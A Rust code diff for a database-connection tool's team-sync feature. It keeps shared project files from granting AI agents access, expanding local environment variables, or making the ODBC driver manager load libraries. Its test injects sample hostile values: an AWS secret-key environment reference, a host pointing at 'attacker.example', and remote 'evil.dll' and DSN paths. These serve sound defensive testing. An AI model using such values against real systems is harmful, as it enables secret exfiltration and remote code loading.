@@ -12,13 +12,13 @@ use std::collections::BTreeMap;
 use std::path::Path;
 
 use platypus_store::{
-    ConnectionFolder, ConnectionStore, LINKS_FILE, Project, SavedSsh, SharedLink, SyncBatch,
-    initials_of,
+    AgentAccess, ConnectionFolder, ConnectionStore, LINKS_FILE, Project, SavedSsh, SharedLink,
+    SyncBatch, initials_of,
 };
 use serde::{Deserialize, Serialize};
 use uuid::Uuid;
 
-use crate::portable::{ShareConnection, guard};
+use crate::portable::{ShareConnection, guard, hold_shared_references, without_native_loads};
 use crate::{Result, SyncError};
 
 /// The project's file in the shared folder.
@@ -66,6 +66,17 @@ pub fn build(store: &ConnectionStore, project: &Project, share_user: bool) -> Sh
         color: project.color.clone(),
         folders: project.folders.clone(),
         connections,
+    }
+}
+
+/// Agent access is each computer's own: `built`, this computer's form of the project, keeps
+/// the access `file` gives the connections it lists already, so that a choice made here (a
+/// connection new here starts with agents kept out, see [`apply`]) does not reach the team.
+pub fn keep_agent_access(built: &mut SharedProject, file: &SharedProject) {
+    for c in &mut built.connections {
+        if let Some(theirs) = file.connections.iter().find(|f| f.id == c.id) {
+            c.agent_access = theirs.agent_access;
+        }
     }
 }
 
@@ -202,6 +213,9 @@ pub struct Applied {
     pub retargeted: usize,
     /// Connections whose safety settings the file loosened: this machine's were kept.
     pub kept_stricter: usize,
+    /// Connections whose new `${env:…}` references were held (see
+    /// [`hold_shared_references`]): they connect as written until the user edits them.
+    pub held_references: usize,
 }
 
 /// Makes the project in `store` what `shared` says, linked to `link`. `local_id` is the
@@ -249,15 +263,23 @@ pub fn apply(
         id,
         retargeted: 0,
         kept_stricter: 0,
+        held_references: 0,
     };
     let mut forget = Vec::new();
     let mut connections = Vec::new();
     for incoming in &shared.connections {
         let existing = store.get(incoming.id);
         let mut saved = incoming.clone().into_saved(existing);
+        // What the file sets is not read from this computer's environment, nor makes the ODBC
+        // driver manager load a library, until the user says so.
+        without_native_loads(existing, &mut saved);
+        let mut held = hold_shared_references(existing, &mut saved);
         if let Some(existing) = existing {
             let guarded = guard(&store.effective(existing), &mut saved);
             if guarded.retargeted {
+                // Sent elsewhere, it takes none of this computer's variables along, not even
+                // those the user had accepted for the old server.
+                held |= hold_shared_references(None, &mut saved);
                 applied.retargeted += 1;
                 // The connection's own tunnel only: a network profile's secrets serve others.
                 forget.push(existing.id);
@@ -277,7 +299,13 @@ pub fn apply(
                 );
             }
             applied.kept_stricter += usize::from(guarded.kept_stricter);
+        } else {
+            // What agents may do on this computer is this computer's say: a connection new
+            // here starts with agents kept out, whatever the file grants, until the user
+            // changes it. Read-only, production and restrictions only make it stricter.
+            saved.agent_access = AgentAccess::Off;
         }
+        applied.held_references += usize::from(held);
         connections.push(saved);
     }
     let invalid = |e: platypus_store::StoreError| SyncError::Invalid(e.to_string());
@@ -368,7 +396,9 @@ mod tests {
             .find(|p| p.id == pid)
             .unwrap()
             .clone();
-        let shared = build(&origin, &project, true);
+        let mut shared = build(&origin, &project, true);
+        // The file would let agents write: here they start kept out of every connection.
+        shared.connections[0].agent_access = AgentAccess::ReadWrite;
         let mut mine = store(&dir.path().join("b"));
         let link = SharedLink {
             path: dir.path().join("team"),
@@ -383,8 +413,20 @@ mod tests {
         let prod = mine.get(shared.connections[0].id).unwrap();
         assert!(prod.save_password && prod.password_command.is_none());
         assert!(!mine.has_password(prod.id).unwrap());
-        // What the app builds from it is what was read: no write-back, no churn in Git.
-        assert_eq!(build(&mine, &opened, true), shared);
+        for c in &shared.connections {
+            assert_eq!(mine.get(c.id).unwrap().agent_access, AgentAccess::Off);
+        }
+        // What the app builds from it is what was read: no write-back, no churn in Git (the
+        // file keeps the agent access it gives).
+        let mut built = build(&mine, &opened, true);
+        keep_agent_access(&mut built, &shared);
+        assert_eq!(built, shared);
+        // An update leaves them out still: the file never loosens this computer's choice.
+        apply(&mut mine, Some(id), &shared, link.clone()).unwrap();
+        assert_eq!(
+            mine.get(shared.connections[0].id).unwrap().agent_access,
+            AgentAccess::Off
+        );
         let writes = mine.revision();
         apply(&mut mine, Some(id), &shared, link).unwrap();
         assert_eq!(mine.projects().len(), 1);
@@ -492,6 +534,78 @@ mod tests {
             assert!(!s.has_password(prod).unwrap());
             assert!(s.secret(ssh_secret).unwrap().is_none());
         }
+    }
+
+    /// A file that would read this computer's environment into a connection, or make the
+    /// ODBC driver manager load a library or open a file of its choosing, is taken in with
+    /// those held: references written `$${…}`, which connect as written, the paths left out.
+    /// A reference this computer has already stays.
+    #[test]
+    fn a_shared_file_reads_no_environment_and_loads_no_library() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut s = store(dir.path());
+        let pid = sample(&mut s);
+        let project = s.projects().iter().find(|p| p.id == pid).unwrap().clone();
+        let prod = project.connections[0];
+        let mut mine = s.get(prod).unwrap().clone();
+        mine.database = "${env:SHOP_DB}".to_owned();
+        s.save(mine, PasswordUpdate::Keep).unwrap();
+        let link = SharedLink {
+            path: dir.path().join("team"),
+            share_user: true,
+        };
+        let project = s.projects().iter().find(|p| p.id == pid).unwrap().clone();
+        let mut file = build(&s, &project, true);
+        file.connections[0].user = Some("${env:AWS_SECRET_ACCESS_KEY}".to_owned());
+        let applied = apply(&mut s, Some(pid), &file, link.clone()).unwrap();
+        assert_eq!((applied.retargeted, applied.held_references), (0, 1));
+        let saved = s.get(prod).unwrap();
+        assert_eq!(saved.user, "$${env:AWS_SECRET_ACCESS_KEY}");
+        assert_eq!(
+            saved.database, "${env:SHOP_DB}",
+            "this computer's own reference"
+        );
+        // Held, a reference reads nothing: the text is taken as written.
+        let vars = platypus_core::EnvVars::with(
+            BTreeMap::from([("AWS_SECRET_ACCESS_KEY".to_owned(), "CANARY".to_owned())]),
+            BTreeMap::new(),
+        );
+        assert_eq!(
+            platypus_core::expand_env(&saved.user, &vars).unwrap(),
+            "${env:AWS_SECRET_ACCESS_KEY}"
+        );
+
+        // The same file read again holds nothing more; the user's edit, written back by the
+        // app, is no change either.
+        let applied = apply(&mut s, Some(pid), &file, link.clone()).unwrap();
+        assert_eq!(applied.held_references, 0);
+        let mut edited = s.get(prod).unwrap().clone();
+        edited.user = "${env:AWS_SECRET_ACCESS_KEY}".to_owned();
+        s.save(edited, PasswordUpdate::Keep).unwrap();
+        let applied = apply(&mut s, Some(pid), &file, link.clone()).unwrap();
+        assert_eq!(applied.held_references, 0);
+        assert_eq!(s.get(prod).unwrap().user, "${env:AWS_SECRET_ACCESS_KEY}");
+
+        // Sent to another server, the connection takes none of this computer's variables
+        // along, not even the accepted ones, and the driver manager loads nothing it names.
+        let c = &mut file.connections[0];
+        c.host = "${env:DB_HOST}.attacker.example".to_owned();
+        c.options.insert(
+            "driver".to_owned(),
+            "\\\\attacker\\share\\evil.dll".to_owned(),
+        );
+        c.options.insert(
+            "connection_string".to_owned(),
+            "Server=h;FILEDSN=\\\\attacker\\x.dsn;SAVEFILE=out.dsn;Driver=/tmp/evil.so;Trusted=\\\\attacker\\c;Database=db".to_owned(),
+        );
+        let applied = apply(&mut s, Some(pid), &file, link).unwrap();
+        assert_eq!((applied.retargeted, applied.held_references), (1, 1));
+        let saved = s.get(prod).unwrap();
+        assert_eq!(saved.host, "$${env:DB_HOST}.attacker.example");
+        assert_eq!(saved.user, "$${env:AWS_SECRET_ACCESS_KEY}");
+        assert_eq!(saved.database, "$${env:SHOP_DB}");
+        assert!(!saved.options.contains_key("driver"));
+        assert_eq!(saved.options["connection_string"], "Server=h;Database=db");
     }
 
     #[test]
